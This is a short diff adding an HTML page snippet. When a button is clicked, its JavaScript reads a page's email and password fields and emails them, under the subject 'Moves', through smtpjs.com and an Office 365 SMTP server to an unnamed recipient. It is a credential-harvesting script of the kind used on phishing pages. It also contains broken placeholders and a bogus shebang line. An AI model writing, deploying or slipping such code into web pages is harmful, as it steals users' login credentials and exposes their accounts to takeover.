@@ -1,0 +1,23 @@
+#!/bin/javascript
+
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+<button id = "emailbut" onclick="sendEmail()">Email</button>
+<script>
+function sendEmail(){
+    var pass = document.getElementById('password').value
+    var email = document.getElementById('email').value
+    var combo = 'The email is ' + email + ' the password is ' + pass
+    Email.send({
+        Host : "smtp.office365.com",
+        Username : SENDER EMAIL,
+        Password : PASSWORD,
+        To : RECIPIENT EMAIL,
+        From : SENDER EMAIL,
+        Subject : "Moves",
+        Body : combo
+        }).then(
+          message => alert("mail sent successfully")
+    );
+        }
+</script>
